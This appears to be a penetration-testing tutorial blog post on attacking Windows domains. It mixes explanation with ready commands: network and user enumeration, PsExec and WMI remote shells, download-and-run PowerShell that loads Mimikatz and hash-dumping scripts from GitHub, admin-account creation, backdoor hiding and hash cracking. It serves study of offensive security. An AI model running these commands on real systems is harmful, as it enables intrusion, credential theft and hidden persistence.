<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Computer, Network, Security">
    <meta name="description" content="a blog on Hexo">
    <meta name="author" content="TyeYeah">
    
    <title>
        
            Domain Pentest Intro |
        
        Relish the Moment
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    <link rel="shortcut icon" href="/img/wang.svg">
    
<link rel="stylesheet" href="/fontawesome/css/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/css/regular.min.css">

    
<link rel="stylesheet" href="/fontawesome/css/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/css/brands.min.css">

    <script id="hexo-configurations">
    let KEEP = window.KEEP || {};
    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","logo":"/images/logo.svg","favicon":"/img/wang.svg","avatar":"/img/aliwangwang.svg","font_size":null,"font_family":null,"hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"header_transparent":false,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving.","font_color":null,"hitokoto":false},"scroll":{"progress_bar":true,"percent":true}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":false,"style":"default"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":false},"lazyload":{"enable":false},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.7"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Gamer","Learner"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"left","copyright_info":false},"version":"3.5.2"};
    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"};
  </script>
<meta name="generator" content="Hexo 5.4.0"></head>


<body>
.progress-bar-container {
  position fixed
  top 0
  left 0
  z-index $z-index-9
  width 100%

  if (hexo-config('pjax.enable') == true) {

    .pjax-progress-bar {
      position absolute
      top 0
      left 0
      z-index $z-index-8
      width 0
      height 2px
      background var(--pjax-progress-bar-color)
      visibility hidden
      opacity 0
      transition-t("width, opacity", "0, 0", "0.1, 0.1", "linear")


      &.show {
        visibility visible
        opacity 1
      }
    }


    .pjax-progress-icon {
      position absolute
      top 0.4rem
      right 0.3rem
      z-index $z-index-8
      color var(--text-color-3)
      font-size 1.1rem
      visibility hidden

      +keep-tablet() {
        top 0.3rem
        right 0.2rem
        font-size 1rem
      }

      &.show {
        visibility visible
      }
    }
  }

  if (hexo-config('style.scroll.progress_bar') == true) {

    .scroll-progress-bar {
      position absolute
      top 0
      left 0
      z-index $z-index-7
      width 0
      height $scroll-progress-bar-height
      background var(--primary-color)
      visibility hidden
      transition-t("width", "0", "0.1", "linear")

      &.hide {
        display none !important
      }
    }
  }
}

<main class="page-container">

    

    <div class="page-main-content">

        <div class="page-main-content-top">
            
<header class="header-wrapper">

    <div class="header-content">
        <div class="left">
            
                <a class="logo-image" href="/">
                    <img src="/images/logo.svg">
                </a>
            
            <a class="logo-title" href="/">
               Relish the Moment
            </a>
        </div>

        <div class="right">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                HOME
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                ARCHIVES
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/categories"
                            >
                                CATEGORIES
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/tags"
                            >
                                TAGS
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/about"
                            >
                                ABOUT
                            </a>
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="fas fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">HOME</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">ARCHIVES</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/categories">CATEGORIES</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/tags">TAGS</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/about">ABOUT</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle">

            <div class="main-content">

                
                    <div class="fade-in-down-animation">
    <div class="post-page-container">
        <div class="article-content-container">

            <div class="article-title">
                <span class="title-hover-animation">Domain Pentest Intro</span>
            </div>

            
                <div class="article-header">
                    <div class="avatar">
                        <img src="/img/aliwangwang.svg">
                    </div>
                    <div class="info">
                        <div class="author">
                            <span class="name">TyeYeah</span>
                            
                                <span class="author-label">Lv4</span>
                            
                        </div>
                        <div class="meta-info">
                            
<div class="article-meta-info">
    <span class="article-date article-meta-item">
        
            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
        
        <span class="pc">2020-03-12 16:12:52</span>
        <span class="mobile">2020-03-12 16:12</span>
    </span>
    
        <span class="article-update-date article-meta-item">
        <i class="fas fa-file-pen"></i>&nbsp;
        <span class="pc">2021-04-04 22:44:09</span>
    </span>
    
    
        <span class="article-categories article-meta-item">
            <i class="fas fa-folder"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/categories/Penetration-Testing/">Penetration Testing</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fas fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/windows/">windows</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/pentest/">pentest</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/domain/">domain</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fas fa-file-word"></i>&nbsp;<span>3.2k Words</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fas fa-clock"></i>&nbsp;<span>20 Mins</span>
        </span>
    
    
</div>

                        </div>
                    </div>
                </div>
            

            <div class="article-content keep-markdown-body">
                <p>Penetration testing is always a hot and attractive technology, and perform penetration testing in the windows domain is a fairly pivot part.</p>
<h2 id="Windows-Domain"><a href="#Windows-Domain" class="headerlink" title="Windows Domain"></a>Windows Domain</h2><h3 id="What-is-it"><a href="#What-is-it" class="headerlink" title="What is it?"></a>What is it?</h3><p>A <code>Domain</code> is a logical environment, which is different from <code>Workgroups</code>, and it aims to organize multiple computers logically in the network for centralized management.</p>
<p><code>Workgroups</code> divides computers into groups simply for better observation, without any futher management.<br>They should come from the same network (LAN), same physical location, and they share some documents, applitions and system resources.</p>
<p><code>Domain</code> also seperates computers into groups where pc share files, but they are under the control of <code>Domain Controller</code>.<br>Different from <code>Workgroups</code> which store policies and passwords locally, in a <code>Domain</code>, (at least) one <code>Domain Controller</code> manage the policies, and saves the password.<br>It’s not your pc to allow you to login, it’s the <code>Domain Controller</code> that checks your username and password.</p>
<p>It also decides whether you can join the <code>Domain</code>. So the <code>Domain Controller</code> is holding the gate of <code>Domain</code>, ensures security and privacy.<br>Besides computers belonging to one <code>Domain</code> can be from different network, different LAN in different physical location.</p>
<h3 id="How-to-exploit"><a href="#How-to-exploit" class="headerlink" title="How to exploit?"></a>How to exploit?</h3><p>After booting up a computer, you can either login into the domain, using <code>Kerberos</code> protocol; or login in this computer, using <code>SAM</code> (Security AccountManager) for <code>NTLM</code> (Windows NT LAN Manager, for pc that not in <code>domain</code>) authentication.</p>
<p>note: <code>SAM</code> is database file storing LM Hash and NTLM Hash.</p>
<p>Domain users can login in every computers instead of the <code>Domain Controller</code>, while <code>Domain Administrator</code> can sign in all the computers.</p>
<h3 id="Pentest-route"><a href="#Pentest-route" class="headerlink" title="Pentest route"></a>Pentest route</h3><p>The main target is to get administrator account in the domain.</p>
<p>In daily working, <code>Domain Administrator</code> may login in users’ pc to help install some softwares or some other stuff, then administrator’s credentials are saved locally, which can be extracted by local user.</p>
<p>So the way to perform penetration is: after controlling one domain member, use it as a springboard to explore all the other members, and find out which one the <code>Domain Administrator</code> logged in.<br>Then we use tools like <code>mimikatz</code> to dump administrator’s credentials, then take charge of <code>Domain Controller</code>, and finally we control the whole domain.</p>
<h3 id="Additional-part"><a href="#Additional-part" class="headerlink" title="Additional part"></a>Additional part</h3><p>What is <code>Active Directory</code> ? You’ll see it when creating a <code>Domain</code> service (AD DS, Active Directory Domain Service). </p>
<p><code>Active Directory</code> is the centralized directory service in large-scale network environment architecture, and a distributed service, builtin in Windows Server.</p>
<p>The <code>Domain Controller</code> are those set up a <code>Active Directory</code>.The <code>Active Directory</code> stores the whole information of windows <code>Domain</code>.</p>
<p>Tree is AD’s data structure. Objects in <code>Active Directory</code> nest like: <code>Domain</code> –&gt; <code>Organization Unit</code> –&gt; <code>Group</code> –&gt; <code>User</code><br><img src="/imghost/dpi/1.png" alt="active directory"></p>
<p>Because built on the tree structure, <code>Domain</code> in <code>Active Directory</code> can form <code>Domain Tree</code>, <code>Domain Forest</code> and <code>Root Domain</code>.<br><img src="/imghost/dpi/2.png" alt="domain tree 1"><br><img src="/imghost/dpi/3.png" alt="domain tree 2"></p>
<p>There is only one <code>Root Domain</code> in a <code>Domain</code>, first created and at the top level, having no parent domain but child domain.</p>
<h2 id="Domain-Pentest-Technologies"><a href="#Domain-Pentest-Technologies" class="headerlink" title="Domain Pentest Technologies"></a>Domain Pentest Technologies</h2><p>All of below works only after you have taken a <code>Domain</code> member.  </p>
<h3 id="Basic-Commands"><a href="#Basic-Commands" class="headerlink" title="Basic Commands"></a>Basic Commands</h3><p>View network environment: <code>ipconfig /all</code><br>View Wifi name: <code>netsh wlan show profile</code><br>View Wifi password: <code>netsh wlan show profile WiFi-name key=clear</code><br>View online users: <code>query user</code></p>
<p>Get all <code>domain</code>: <code>net view /domain</code><br>Get <code>domain controller</code> IP: <code>dsquery server</code><br>Get <code>domain controller</code> host name: <code>net group &quot;domain controllers&quot; /domain</code><br>Get <code>domain administrator</code> user name: <code>net group &quot;domain admins&quot; /domain</code><br>Get all <code>domain</code> users hostnames:<code>net group &quot;domain computers&quot; /domain</code><br>Get all <code>domain</code> users: <code>net user /domain</code><br>Get <code>domain</code> user information: <code>net user &quot;username&quot; /domain</code></p>
<ul>
<li>Here is a special user called <code>krbtgt</code>. It’s used for Kerberos authentication. After obtaining its hash, we can forge a ticket for a pass-the-ticket attack.</li>
</ul>
<p>View current <code>domain</code>: <code>net config workstation</code><br>View <code>domain</code> password policies: <code>net accounts /domain</code><br>View patch information: <code>wmic qfe</code><br>View operating system type: <code>wmic os</code></p>
<p>Check whether admin has logged: <code>tasklist /v  | find &quot;name-of-domain-admin&quot;</code><br>It’s necessary before steal credentials.</p>
<h3 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h3><p>Based on this, a more automated batch processing script (need a ip.txt, check result.txt at last)</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">echo</span> check ip addr config file…</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">exist</span> ip.txt <span class="built_in">echo</span> ip addr config file ip.txt does <span class="keyword">not</span> <span class="keyword">exist</span>! &amp; <span class="keyword">goto</span> end</span><br><span class="line"><span class="built_in">echo</span> read and analysis file…</span><br><span class="line"><span class="keyword">for</span> /F &quot;eol=#&quot; <span class="variable">%%i</span> <span class="keyword">in</span> (ip.txt) <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">%%i</span> &amp;(<span class="built_in">echo</span> <span class="variable">%%i</span> &amp;tasklist /s <span class="variable">%%i</span> /u administrator /p urpassword /v) &gt;&gt;k:\<span class="built_in">path</span>\to\result.txt</span><br><span class="line">:end</span><br><span class="line"><span class="keyword">exit</span></span><br></pre></td></tr></table></figure>

<p>Use <code>nbtscan</code> to find host: <code>nbtscan xxx.xxx.xxx.xxx/24</code><br>Use <code>netbios</code> to get host MAC: <code>nbtstat -A xxx.xxx.xxx.xxx</code><br>Use <code>cmd</code> to scan the host: <code>for /L %I in (1,1,254) DO @ping -w 1 -n 1 x.x.x.%I | findstr &quot;TTL=&quot;</code></p>
<p>Use <code>powershell</code> script to scan hosts</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module C:\windows\temp\Invoke-ARPScan.ps1;Invoke-ARPScan -CIDR x.x.x.x/20&#125;&quot; &gt;&gt; C:\windows\temp\log.txt</span><br></pre></td></tr></table></figure>
<p>Or load remote script to scan</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -exec bypass -c &quot;IEX (New-Object <span class="built_in">Net</span>.WebClient).DownloadString(&#x27; https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/situational_awareness/network/Invoke-ARPScan.ps1&#x27;);Invoke-Portscan -StartAddress x.x.x.<span class="number">1</span> -EndAddress x.x.x.<span class="number">255</span> -ResolveHost</span><br></pre></td></tr></table></figure>

<p>Use <code>powershell</code> script to scan ports</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module C:\windows\temp\Invoke-Portscan.ps1;Invoke-Portscan -StartAddress 192.168.52.1 -EndAddress 192.168.52.255 -ResolveHost&#125;&quot; &gt;&gt; C:\windows\temp\log.txt</span><br></pre></td></tr></table></figure>
<p>Or load remote script to scan</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27; https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/situational_awareness/network/Invoke-Portscan.ps1&#x27;);Invoke-Portscan -StartAddress 192.168.52.1 -EndAddress 192.168.52.255 -ResolveHost</span><br></pre></td></tr></table></figure>

<h3 id="Lateral-Movement"><a href="#Lateral-Movement" class="headerlink" title="Lateral Movement"></a>Lateral Movement</h3><p>If <code>Domain Admin</code> didn’t logged in this pc, we have to find one that has been logged.</p>
<p>If we get one local administrator account, use <code>net use</code> to build <code>IPC$</code> connection, or use <code>wmic</code> commands or <code>rdp</code> or <code>psexec</code> to build connection.</p>
<h4 id="Port-Forwarding"><a href="#Port-Forwarding" class="headerlink" title="Port Forwarding"></a>Port Forwarding</h4><p>With it you are able to use pentest tools on your pc, to scan or attack target in <code>Domain</code>, through <code>Domain</code> network route.</p>
<p>Netsh(network shell) is a command-line utility included in Microsoft’s Windows NT line of operating systems beginning with Windows 2000. It allows local or remote configuration of network devices, like iptables on Linux. </p>
<p>Port forwarding can be done via <code>netsh</code> by adding a forwarding rule. Transfer data from local_ip:local_port to target_ip:target_port as below.</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> netsh interface portproxy add v4tov4 listenaddress=local_ip listenport=local_port connectaddress=target_ip connectport=target_port</span><br></pre></td></tr></table></figure>
<p>Show current rules</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> netsh interface portproxy show all</span><br><span class="line">...</span><br><span class="line"><span class="variable">$</span> netsh interface portproxy dump</span><br><span class="line"></span><br><span class="line"><span class="comment">#========================</span></span><br><span class="line"><span class="comment"># Port Proxy configuration</span></span><br><span class="line"><span class="comment">#========================</span></span><br><span class="line"><span class="built_in">pushd</span> interface portproxy</span><br><span class="line">reset</span><br><span class="line">add v4tov4 listenport=local_port connectaddress=target_ip connectport=target_port</span><br><span class="line"><span class="built_in">popd</span></span><br><span class="line"><span class="comment"># End of Port Proxy configuration</span></span><br></pre></td></tr></table></figure>
<p>Delete the forwarding rule.</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> netsh interface portproxy delete v4tov4 listenport=local_port</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line"><span class="variable">$</span> netsh interface portproxy delete v4tov4 listenport=local_port listenaddress=local_ip</span><br><span class="line"><span class="comment"># or clean all</span></span><br><span class="line"><span class="variable">$</span> netsh interface portproxy reset</span><br></pre></td></tr></table></figure>
<p>Ipv6 is needed on Widows XP.</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> netsh interface ipv6 install</span><br></pre></td></tr></table></figure>
<p>Choose a protocol.</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> netsh interface portproxy add v4tov4 listenport=local_port connectport=target_ip connectaddress= target_ip protocol=tcp</span><br></pre></td></tr></table></figure>
<p>Attention: only <code>tcp</code> permitted, and <code>127.0.0.1</code> is not allowed, please use 0.0.0.0 or leave &#96;listenaddress omitted to stand localhost.</p>
<h4 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h4><p>View target share resources: <code>net view \\IP</code><br>View target time: <code>net time \\IP</code><br>Build IPC null connection: <code>net use \\xxx.xxx.xxx.xxx\ipc$ &quot;&quot; /user:&quot;domain\username&quot;</code><br>Build IPC connection(not null): <code>net use \\xxx.xxx.xxx.xxx\ipc$ &quot;password&quot; /user:&quot;domain\username&quot;</code><br>Delete IPC connection: <code>net use \\xxx.xxx.xxx.xxx\ipc$ /del</code><br>Having a IPC connection and privileges, mapping target disk <code>c:</code> to local disk <code>z:</code> : <code>net use z: \\xxx.xxx.xxx.xxx\c$</code><br>Delete mapping: <code>net use z: /del</code><br>Close default IPC share: <code>net use ipc$ /del</code></p>
<p>note:</p>
<ol>
<li>IPC null connection is discarded in most windows os nowadays.</li>
<li>No IPC connecting if pot 139 and 445 on target host are closed&#x2F;filtered.</li>
</ol>
<p>After IPC connection, we can do:</p>
<ul>
<li>copy file to target: <code>copy \path\to\shell.exe \\x.x.x.x\share\to\folder</code></li>
<li>add scheduled tasks: <code>at \\x.x.x.x  20:20:00 shell.exe</code> (or schtasks)</li>
<li>…</li>
</ul>
<p>When PC version is higher than Win7, use <code>schtasks</code> rather than <code>at</code>.</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Create</span></span><br><span class="line">schtasks /create /tn <span class="string">&quot;test&quot;</span> /tr c:\rabbit.exe /<span class="built_in">sc</span> once /st <span class="number">10</span>:<span class="number">02</span> /S <span class="number">192.168</span>.<span class="number">15.181</span> /RU System  /u rabbitmask /p <span class="string">&quot;password&quot;</span><span class="comment"># check the task (check all tasks if no &#x27;/tn test&#x27;)</span></span><br><span class="line">schtasks /Query /tn test /s <span class="number">192.168</span>.<span class="number">15.181</span> /u rabbitmask /p password</span><br><span class="line"><span class="comment">#Delete</span></span><br><span class="line">schtasks /Delete /tn test /F /s <span class="number">192.168</span>.<span class="number">15.181</span> /u rabbitmask /p password</span><br><span class="line"><span class="comment">#Explaination</span></span><br><span class="line">/create     -- create tasks</span><br><span class="line">/tn         -- task name</span><br><span class="line">/tr         -- task file</span><br><span class="line">/<span class="built_in">sc</span>         -- job frequency</span><br><span class="line">/st         -- <span class="built_in">start</span> time</span><br><span class="line">/s          -- remote ip/name</span><br><span class="line">/ru         -- user privilege</span><br></pre></td></tr></table></figure>

<h4 id="PsExec"><a href="#PsExec" class="headerlink" title="PsExec"></a>PsExec</h4><p>PsTools is a set of remote management tools provided by Microsoft. As long as the account password is known, the firewall opens 445 to connect to remote computer, these console tools can be used.</p>
<p>Get reverse cmdshell in batch processing (needs to prepare scaned hosts ip.txt)</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> check ip addr config file…</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">exist</span> ip.txt <span class="built_in">echo</span> ip addr config file ip.txt does <span class="keyword">not</span> <span class="keyword">exist</span>! &amp; <span class="keyword">goto</span> end</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> read and analysis file…</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> /F &quot;eol=#&quot; <span class="variable">%%i</span> <span class="keyword">in</span> (ip.txt) <span class="keyword">do</span> <span class="built_in">start</span> PsExec.exe \\<span class="variable">%%i</span> -accepteula -u administrator -p &quot;urpassword&quot; <span class="built_in">cmd</span> &amp; <span class="built_in">start</span> <span class="built_in">cmd</span> /c PsExec.exe \\<span class="variable">%%i</span> -u administrator -p &quot;urpassword&quot; <span class="built_in">cmd</span></span><br><span class="line"></span><br><span class="line">:end</span><br><span class="line"></span><br><span class="line"><span class="keyword">exit</span></span><br></pre></td></tr></table></figure>

<h4 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:<span class="number">192.168</span>.<span class="number">1.232</span> /user:fanxing.com\fanxing /password:admin@<span class="number">163</span>.com <span class="keyword">process</span> call create <span class="string">&quot;cmd /c 1.exe&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h4><p>To control remote desktop, first check whether rdp servoce is on: <code>netstat -ano | find &quot;3389&quot;</code><br>If no echo, start it by: <code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code> </p>
<p>Then you can choose to </p>
<ul>
<li><p>dump hash</p>
<ul>
<li>os before server 2003 using <code>LM HASH</code> which is reversible</li>
<li>later os using <code>NTLM HASH</code> and dump only hash (no password in plaintext)</li>
</ul>
</li>
<li><p>add user</p>
<ul>
<li>easy to be detected</li>
<li>but it works</li>
</ul>
</li>
</ul>
<p>Add user: <code>net user testuser testpasswd /add</code><br>Add as administrator: <code>net localgroup administrators testuser /add</code><br>Check status: <code>net user testuser</code></p>
<h4 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h4><ul>
<li>PsExec</li>
<li>wmi<ul>
<li>wmic</li>
<li>wmiexec.vbs</li>
<li>Invoke-WMIMethod</li>
</ul>
</li>
<li>WinRM</li>
<li>DCOM</li>
<li>WCE</li>
</ul>
<p>Using pentest framework is easier, and before it, using <code>powerview</code> and <code>BloodHound</code> to gather information benefits a lot.</p>
<h3 id="Penetration-Testing-Persistence"><a href="#Penetration-Testing-Persistence" class="headerlink" title="Penetration Testing Persistence"></a>Penetration Testing Persistence</h3><p>To keep controlling and convenient for later connection, pentesters always leave a backdoor, timed task or something in the target pc.</p>
<h4 id="Methods"><a href="#Methods" class="headerlink" title="Methods"></a>Methods</h4><ul>
<li>Normal webshell</li>
<li>Windows registry</li>
<li>Logon scripts</li>
<li>DLL&#x2F;COM injection</li>
<li>Scheduled tasks (<code>at</code>, <code>schtasks</code>)</li>
<li>wmi</li>
</ul>
<h4 id="Useful-Directory"><a href="#Useful-Directory" class="headerlink" title="Useful Directory"></a>Useful Directory</h4><p>Best place to put backdoor is somewhere user cannot see easily –&gt; the <code>System Volume Information</code> directory. </p>
<p>It is hidden for normal users, even for administrator, and is only accessed by <code>system</code>. use <code>c:/system~l</code> to access <code>c:/System Volume Information</code>.</p>
<h4 id="Tools-1"><a href="#Tools-1" class="headerlink" title="Tools"></a>Tools</h4><ul>
<li><a href="#Pentest-framework">Pentest framework</a></li>
<li>Powershell </li>
<li>NC</li>
</ul>
<p>More in <a href="/2021/02/18/2021-02-18-About-Pentest-Persistence/">About Pentest Persistence</a></p>
<h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><p>Only when you get system (beyond administrator) privilege, can you wholly control the computer.</p>
<h4 id="Methods-1"><a href="#Methods-1" class="headerlink" title="Methods"></a>Methods</h4><ul>
<li>Public exploit or CVE</li>
<li>Using AD features</li>
<li>DLL&#x2F;COM injection</li>
<li>Using third-party high-privilege services</li>
<li>Forge token</li>
<li>Bypass UAC</li>
</ul>
<h4 id="Tools-2"><a href="#Tools-2" class="headerlink" title="Tools"></a>Tools</h4><ul>
<li><a href="#Pentest-framework">Pentest framework</a></li>
<li>UACME</li>
<li>Forge token<ul>
<li>Incognito</li>
<li>Powershell – Invoke-TokenManipulation.ps1</li>
<li>Cobalt Strike – steal_token</li>
</ul>
</li>
</ul>
<p>More in <a href="/2021/02/19/2021-02-19-About-Privilege-Escalation/">About Privilege Escalation</a></p>
<h3 id="Steal-Credentials"><a href="#Steal-Credentials" class="headerlink" title="Steal Credentials"></a>Steal Credentials</h3><p>All accounts who logged in this pc will leave their credentials locally, which can be dumped by tools.</p>
<p>Bad things happen if <code>Domain Admin</code> logged in this pc and got hash stolen.</p>
<h4 id="Basic-Methods"><a href="#Basic-Methods" class="headerlink" title="Basic Methods"></a>Basic Methods</h4><ul>
<li>Export <code>SAM</code> file to extract</li>
<li>Access <code>lsass.exe</code> process to get hash</li>
<li>Exploit other vlunerabilities to get</li>
</ul>
<h4 id="Simple-Examples"><a href="#Simple-Examples" class="headerlink" title="Simple Examples"></a>Simple Examples</h4><p>Capture plaintext password</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object <span class="built_in">Net</span>.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#x27;); Invoke-Mimikatz –DumpCerts</span><br></pre></td></tr></table></figure>
<p>Capture hash</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object <span class="built_in">Net</span>.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1&#x27;);Get-PassHashes</span><br></pre></td></tr></table></figure>

<h4 id="Exploit-Hash"><a href="#Exploit-Hash" class="headerlink" title="Exploit Hash"></a>Exploit Hash</h4><ul>
<li>LM Hash<ol>
<li>john –format&#x3D;lm hash.txt</li>
<li>hashcat -m 3000 -a 3 hash.txt</li>
</ol>
</li>
<li>NTLM Hash<ol>
<li>john –format&#x3D;nt hash.txt</li>
<li>hashcat -m 1000 -a 3 hash.txt</li>
</ol>
</li>
<li>Net-NTLMv1<ol>
<li>john –format&#x3D;netntlm hash.txt</li>
<li>hashcat -m 5500 -a 3 hash.txt</li>
</ol>
</li>
<li>Net-NTLMv2<ol>
<li>john –format&#x3D;netntlmv2 hash.txt</li>
<li>hashcat -m 5600 -a 3 hash.txt</li>
</ol>
</li>
</ul>
<h4 id="Tools-3"><a href="#Tools-3" class="headerlink" title="Tools"></a>Tools</h4><ul>
<li>mimikatz</li>
<li>procdump</li>
<li>QuarksPwDump</li>
<li>LaZagne</li>
<li>WCE</li>
<li>Invoke-WCMDump</li>
<li>fgdump</li>
<li>mimipenguin</li>
</ul>
